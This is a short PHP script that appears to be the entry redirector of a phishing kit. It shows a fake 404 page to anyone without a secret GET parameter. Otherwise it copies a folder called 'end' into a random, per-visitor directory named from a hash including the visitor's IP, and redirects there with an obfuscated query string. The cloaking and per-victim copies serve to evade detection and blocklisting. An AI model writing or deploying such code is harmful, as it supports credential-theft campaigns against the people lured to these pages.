<?php


if (!isset($_GET['r_i'])){
header('HTTP/1.0 403 Forbidden');
die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this  server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p></body></html>');
}
    


$random = rand(1000000,1000000000).$_SERVER['REMOTE_ADDR'];

$dst		= substr(md5($random), 0, 20);
	
function recurse_copy($src, $dst) {

	$dir = opendir($src);
	$result = ($dir === false ? false : true);

	if ($result !== false) {
		$result = @mkdir($dst);

		if ($result === true) {
			while(false !== ( $file = readdir($dir)) ) { 
				if (( $file != '.' ) && ( $file != '..' ) && $result) { 
					if ( is_dir($src . '/' . $file) ) { 
						$result = recurse_copy($src . '/' . $file,$dst . '/' . $file); 
					} else { 
						$result = copy($src . '/' . $file,$dst . '/' . $file); 
					} 
				} 
			} 
			closedir($dir);
		}
	}

	return $result;
}

$src="end";
$Uhs ='?item_=2432-0ln-6x4o-tjxvgeodsa3432ludh6_632423ay2d0egyhpvenlzy6a234324i14fg4kbq31l7pzi9rffdsfsdfsdu8234wvfsfxcbsfsdfs1x4324m3w7kj40iscdvf29zlu234236hs0mux8gdtwqp4324295bok37jr';
recurse_copy( $src, $dst );
header("location:".$dst.$Uhs."");
exit;


?>